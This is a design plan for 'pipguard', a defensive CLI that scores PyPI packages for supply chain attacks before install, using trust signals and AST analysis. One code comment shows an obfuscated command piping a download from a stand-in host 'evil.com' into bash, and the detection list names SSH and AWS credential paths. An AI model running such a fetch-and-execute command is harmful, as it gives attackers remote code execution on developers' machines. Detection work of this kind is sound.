# pipguard — Plan & Scope

> "Know what you're installing before you install it."

A CLI tool that intercepts `pip install` and analyzes packages for supply chain attacks before they touch your system. The data to detect malicious packages already exists — PyPI, OSV.dev, GitHub. The gap is workflow integration. Nobody has made checking automatic at the exact moment of install.

---

## The Problem

Supply chain attacks are increasing, especially in AI/ML where developers install unfamiliar packages constantly. Attack vectors: typosquatting (`reqeusts`, `nunpy`), dependency confusion, account takeover, slow poisoning (xz utils 2024), maintainer going rogue (colors.js). Common payload: steal API keys/SSH keys, open backdoors — all through `setup.py` which executes automatically on install.

---

## Architecture

### Layer 1 — Trust Score (API calls, no download)

| Signal | Source |
|--------|--------|
| Package age, version history | PyPI JSON API |
| Download spike > 300% week-over-week AND total downloads < 50k | pypistats.org |
| No linked GitHub repo | PyPI JSON API |
| Maintainer account age, # of other packages | PyPI JSON API |
| Maintainer changed between versions | PyPI JSON API |
| Known CVEs | OSV.dev API |
| GitHub README (only when classifiers are ambiguous) | GitHub API |

### Layer 2 — Static Code Analysis (AST-based)

Downloads the source tarball and analyzes `setup.py`, `pyproject.toml`, `__init__.py` — without executing anything.

Flags: network requests, env var access (`os.environ`), home dir access (`~/.ssh`, `~/.aws`), shell execution (`subprocess`, `eval`, `exec`), base64 obfuscation, DNS lookups.

**Why AST over grep:** AST catches obfuscated patterns grep misses:
```python
getattr(os, 'sys'+'tem')('curl evil.com | bash')  # grep misses, AST catches
```

---

## Scoring

```
0–30  → LOW RISK     31–60  → MEDIUM RISK     61+  → HIGH RISK
```

| Signal | Points |
|--------|--------|
| Known CVE | +50 |
| Shell execution in setup.py | +40 |
| Base64 obfuscation | +35 |
| Package < 30 days old | +30 |
| Home directory access | +30 |
| Network call in setup.py | +25 |
| Reads env variables | +20 |
| Maintainer account < 60 days old | +20 |
| Download spike (< 50k total only) | +15 |
| No GitHub repo | +10 |

**Context-aware:** same flag scores differently based on trust profile. Network call from a 4-year-old package with 50M downloads weighs less than the same flag from a 2-week-old package. Age and downloads compound.

**No static whitelist.** A whitelist creates a blind spot — a compromised boto3 would silently pass. Context-aware scoring + classifier gating handles false positives without a trust bypass.

**Configurable weights** via `~/.pipguard/config.toml`. Ships with a `recommended` preset. Warns when user deviates significantly: `"Custom weights active — run pipguard config reset to restore recommended"`.

---

## Classifier-Gated GitHub Calls

PyPI classifiers (free — already in the PyPI response) gate whether the GitHub README call is made. GitHub's unauthenticated limit is 60 req/hr — a 20-package scan exhausts it fast without gating.

```
Pure Python classifiers + network call found  →  FLAG at full weight, skip GitHub
Networking / AI / Build Tools classifiers     →  Fetch GitHub README, discount if intent matches
No useful classifiers                         →  Fetch GitHub README, default weight if unclear
```

**Pure Python classifiers:** `Topic :: Utilities`, `Topic :: Text Processing`, `Topic :: Software Development :: Libraries :: Python Modules`

**"Network expected" classifiers:** `Topic :: Internet :: WWW/HTTP`, `Topic :: System :: Networking`, `Topic :: Scientific/Engineering :: Artificial Intelligence`, `Topic :: Software Development :: Build Tools`

---

## CLI

```bash
pipguard install <package>                 # analyze then install
pipguard scan                              # scan requirements.txt
pipguard scan --ci --fail-on [medium|high] # CI mode, exits 1 on threshold (default: high)
pipguard info <package> [--no-cache]       # report without installing
pipguard history                           # past scan results
pipguard update --force                    # wipe + refresh CVE cache immediately
```

**Interception:** uses pip's official plugin API (pip 23.1+), not a shell alias. An alias that crashes locks the developer out of pip entirely. A plugin degrades gracefully.

**Example output:**
```
$ pipguard install litellm

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 TRUST SCORE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Package age:      2 months   ⚠️
 Maintainer age:   3 weeks    🔴
 Download spike:   +380%      ⚠️
 Other packages:   0          🔴
 Known vulns:      0          ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 CODE ANALYSIS (setup.py)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Network requests: FOUND      🔴
 Env var access:   FOUND      🔴
 Shell execution:  NOT FOUND  ✅
 Obfuscation:      NOT FOUND  ✅

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 VERDICT: 🔴 HIGH RISK (Score: 75)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Proceed anyway? [y/N]
```

---

## Tech Stack

| Component | Choice |
|-----------|--------|
| Language | Python (dogfoods itself) |
| CLI | Typer |
| HTTP | httpx (API calls + tarball downloads — no requests) |
| AST | Python `ast` stdlib |
| Output | Rich |
| Cache | SQLite stdlib (`~/.pipguard/cache.db`) |

**Caching:** trust scores cached 24hr, CVE data 6hr. Shows `(cached)` on hits. `--no-cache` bypasses per-run. `pipguard update --force` wipes CVE cache immediately for zero-day events.

**Version pinning:** always checks the exact pinned version from requirements.txt, not latest. Warns on unpinned deps.

---

## Build Order

**Week 1 — Core**
- [ ] CLI skeleton (Typer), PyPI fetch, OSV.dev check, scoring, SQLite cache

**Week 2 — Code Analysis**
- [ ] Tarball download (httpx, version-specific), AST parser, red flag detection, classifier-gated scoring, GitHub README for ambiguous cases

**Week 3 — Polish**
- [ ] Rich output, requirements.txt scan, pip plugin integration, `--ci`/`--fail-on`/`--no-cache`/`--force`, configurable weights + preset warning, README + demo GIF

---

## MCP Server Integration (Claude Code)

**Goal:** Let Claude Code analyze packages before `pip install` as part of its agentic flow.

**How it works:**
1. Claude Code encounters import → calls pipguard MCP tool: `analyze_package("fastapi")`
2. MCP server runs existing pipguard analysis pipeline
3. Returns: `{score, verdict, signals, should_install}`
4. Claude Code prompts user if red flag (HIGH/MEDIUM risk)
5. User approves or blocks → proceeds with or skips install

**MCP Server exposes two tools:**
- `analyze_package(name)` — Returns full verdict
- `quick_check(name)` — Returns verdict enum (GREEN/YELLOW/RED)

**Setup:** User registers MCP server in Claude Code settings.json, Claude Code calls it before running pip.

---

## vs. Existing Tools

| Tool | Gap |
|------|-----|
| `pip audit` | Only known CVEs — misses new malicious packages |
| socket.dev | Not a CLI intercept, separate workflow |
| OSV.dev | Database only, no workflow integration |
| Dependabot | Reacts after install, not before |
| **pipguard** | Intercepts at install, combines trust signals + AST analysis |
